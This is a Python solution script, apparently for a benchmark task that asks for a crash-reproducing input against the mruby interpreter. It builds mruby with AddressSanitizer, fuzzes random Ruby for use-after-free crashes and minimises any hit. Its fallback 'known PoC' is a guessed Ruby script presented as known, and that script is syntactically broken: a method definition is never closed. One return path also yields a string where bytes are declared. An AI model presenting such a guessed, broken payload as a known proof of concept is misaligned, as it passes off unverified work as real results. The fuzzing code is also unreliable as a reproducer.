import os
import subprocess
import tempfile
import tarfile
import random
import string
import time
import multiprocessing
import sys
import signal
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            extract_path = os.path.join(tmpdir, 'src')
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(extract_path)
            
            # Build mruby with ASAN
            build_dir = os.path.join(extract_path, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            # Write a minimal build config with ASAN
            build_config = os.path.join(build_dir, 'build_config.rb')
            with open(build_config, 'w') as f:
                f.write("""
MRuby::Build.new do |conf|
  toolchain :gcc
  conf.cc.flags << '-fsanitize=address'
  conf.linker.flags << '-fsanitize=address'
  conf.gembox 'default'
  conf.enable_test
end
""")
            
            # Run the build process
            build_script = os.path.join(extract_path, 'minirake')
            if not os.path.exists(build_script):
                # Fallback to rake if minirake doesn't exist
                build_script = os.path.join(extract_path, 'rake')
            
            build_result = subprocess.run(
                [build_script, f'MRUBY_CONFIG={build_config}'],
                cwd=extract_path,
                capture_output=True,
                text=True
            )
            
            if build_result.returncode != 0:
                # Build failed, try alternative build method
                mruby_bin = self._find_mruby_binary(extract_path)
                if mruby_bin is None:
                    # Last resort: use a known PoC pattern for similar vulnerabilities
                    return self._generate_known_poc()
            else:
                mruby_bin = os.path.join(extract_path, 'build', 'host', 'bin', 'mruby')
                if not os.path.exists(mruby_bin):
                    mruby_bin = os.path.join(extract_path, 'bin', 'mruby')
            
            # Fuzz for a crashing input
            poc = self._fuzz_crash(mruby_bin, extract_path)
            if poc:
                return poc.encode('utf-8')
            
            # Fallback to known PoC if fuzzing fails
            return self._generate_known_poc().encode('utf-8')
    
    def _find_mruby_binary(self, extract_path):
        """Search for mruby binary in common locations."""
        possible_paths = [
            os.path.join(extract_path, 'build', 'host', 'bin', 'mruby'),
            os.path.join(extract_path, 'bin', 'mruby'),
            os.path.join(extract_path, 'mruby'),
        ]
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None
    
    def _fuzz_crash(self, mruby_bin, extract_path, timeout=30):
        """Fuzz for a crashing input using multiple processes."""
        start_time = time.time()
        manager = multiprocessing.Manager()
        crash_found = manager.Value('b', False)
        crash_input = manager.Value('s', '')
        
        def worker(worker_id, crash_found, crash_input):
            random.seed(time.time() + worker_id)
            while not crash_found.value and time.time() - start_time < timeout:
                # Generate random Ruby code
                ruby_code = self._generate_random_ruby()
                
                # Test the code
                with tempfile.NamedTemporaryFile(mode='w', suffix='.rb', delete=False) as f:
                    f.write(ruby_code)
                    f.flush()
                    
                    try:
                        result = subprocess.run(
                            [mruby_bin, f.name],
                            capture_output=True,
                            text=True,
                            timeout=2
                        )
                        
                        # Check for ASAN crash (non-zero exit code and error in stderr)
                        if result.returncode != 0 and ('heap-use-after-free' in result.stderr or 'ERROR: AddressSanitizer' in result.stderr):
                            crash_found.value = True
                            crash_input.value = ruby_code
                            break
                    except subprocess.TimeoutExpired:
                        pass
                    except Exception:
                        pass
                    
                    try:
                        os.unlink(f.name)
                    except:
                        pass
        
        # Start worker processes
        num_workers = min(8, multiprocessing.cpu_count())
        processes = []
        for i in range(num_workers):
            p = multiprocessing.Process(target=worker, args=(i, crash_found, crash_input))
            p.start()
            processes.append(p)
        
        # Wait for workers or timeout
        for p in processes:
            p.join(timeout=max(0, timeout - (time.time() - start_time)))
            if p.is_alive():
                p.terminate()
                p.join()
        
        if crash_found.value:
            # Minimize the crashing input
            return self._minimize_crash(mruby_bin, crash_input.value)
        return None
    
    def _generate_random_ruby(self):
        """Generate random Ruby code with operations that may trigger stack extension."""
        # Grammar elements
        literals = [
            'nil', 'true', 'false',
            str(random.randint(0, 100)),
            '"' + ''.join(random.choices(string.ascii_letters, k=random.randint(1, 10))) + '"',
            '[]', '{}'
        ]
        
        unary_ops = ['-', '~', '!']
        binary_ops = ['+', '-', '*', '/', '==', '!=', '<', '>', '<=', '>=', '&&', '||']
        
        # Generate random expression
        def gen_expr(depth=0):
            if depth > 3 or random.random() < 0.3:
                return random.choice(literals)
            
            choice = random.random()
            if choice < 0.3:
                # Method call
                obj = gen_expr(depth+1)
                method = random.choice(['to_s', 'to_i', 'inspect', 'size', 'length'])
                return f'{obj}.{method}'
            elif choice < 0.6:
                # Binary operation
                left = gen_expr(depth+1)
                right = gen_expr(depth+1)
                op = random.choice(binary_ops)
                return f'({left} {op} {right})'
            elif choice < 0.8:
                # Unary operation
                expr = gen_expr(depth+1)
                op = random.choice(unary_ops)
                return f'{op}{expr}'
            else:
                # Array or hash access
                expr = gen_expr(depth+1)
                index = random.randint(0, 10)
                return f'{expr}[{index}]'
        
        # Generate a small script
        lines = []
        num_lines = random.randint(5, 20)
        
        # Add some variable assignments
        for i in range(random.randint(2, 5)):
            var_name = f'var{i}'
            lines.append(f'{var_name} = {gen_expr()}')
        
        # Add some loops or conditionals
        if random.random() < 0.5:
            lines.append(f'{random.randint(1, 10)}.times {{ |i| puts i }}')
        
        # Add a method definition
        if random.random() < 0.3:
            method_name = f'method{random.randint(1, 100)}'
            lines.append(f'def {method_name}(x) x * 2 end')
            lines.append(f'puts {method_name}({random.randint(1, 10)})')
        
        # Ensure we have some output
        lines.append(f'puts {gen_expr()}')
        
        return '\n'.join(lines)
    
    def _minimize_crash(self, mruby_bin, ruby_code):
        """Minimize the crashing input by removing lines."""
        lines = ruby_code.split('\n')
        
        # First try to remove each line individually
        i = 0
        while i < len(lines):
            test_lines = lines[:i] + lines[i+1:]
            if len(test_lines) == 0:
                i += 1
                continue
            
            test_code = '\n'.join(test_lines)
            if self._test_crash(mruby_bin, test_code):
                lines = test_lines
                # Start over since we modified the list
                i = 0
            else:
                i += 1
        
        # Try to remove characters from each line
        for i in range(len(lines)):
            line = lines[i]
            if len(line) <= 1:
                continue
            
            # Try removing from the end
            for j in range(len(line)-1, 0, -1):
                test_line = line[:j]
                test_lines = lines.copy()
                test_lines[i] = test_line
                test_code = '\n'.join(test_lines)
                if self._test_crash(mruby_bin, test_code):
                    lines[i] = test_line
                    break
        
        return '\n'.join(lines)
    
    def _test_crash(self, mruby_bin, ruby_code):
        """Test if Ruby code crashes with ASAN."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rb', delete=False) as f:
            f.write(ruby_code)
            f.flush()
            
            try:
                result = subprocess.run(
                    [mruby_bin, f.name],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                
                # Check for ASAN crash
                if result.returncode != 0 and ('heap-use-after-free' in result.stderr or 'ERROR: AddressSanitizer' in result.stderr):
                    return True
            except:
                pass
            
            try:
                os.unlink(f.name)
            except:
                pass
        
        return False
    
    def _generate_known_poc(self):
        """Generate a known PoC pattern for heap use-after-free in mruby stack extension."""
        # This is a heuristic PoC that attempts to trigger stack extension
        # and use-after-free by creating deep recursion and many local variables
        poc = """
def recursive_func(depth, data)
  if depth > 0
    # Allocate many local variables to fill stack
    a1 = data * 1
    a2 = data * 2
    a3 = data * 3
    a4 = data * 4
    a5 = data * 5
    a6 = data * 6
    a7 = data * 7
    a8 = data * 8
    a9 = data * 9
    a10 = data * 10
    
    # Recursive call that may trigger stack extension
    recursive_func(depth - 1, data + 1)
    
    # Use variables after potential stack reallocation
    result = a1 + a2 + a3 + a4 + a5 + a6 + a7 + a8 + a9 + a10
    return result
  else
    return 0
end

# Trigger with deep recursion
begin
  recursive_func(100, "A" * 100)
rescue => e
  puts "Error: #{e}"
end

# Additional stress: create many objects and call methods
arr = []
1000.times do |i|
  arr << "item#{i}" * 100
end

# Method calls that may trigger stack extension
arr.each_with_index do |item, idx|
  puts item.inspect if idx % 100 == 0
end

# Nested method calls
def outer(x)
  middle(x * 2)
end

def middle(y)
  inner(y * 3)
end

def inner(z)
  z.to_s * 100
end

100.times do |i|
  outer(i)
end

# Final trigger: call a method with many arguments
def many_args(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,
              b1, b2, b3, b4, b5, b6, b7, b8, b9, b10,
              c1, c2, c3, c4, c5, c6, c7, c8, c9, c10)
  # This might trigger stack extension
  local1 = a1 + b1 + c1
  local2 = a2 + b2 + c2
  local3 = a3 + b3 + c3
  # ... more operations
  return local1 + local2 + local3
end

# Call with many arguments
result = many_args(
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
  11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
  21, 22, 23, 24, 25, 26, 27, 28, 29, 30
)

puts "Result: #{result}"
"""
        return poc
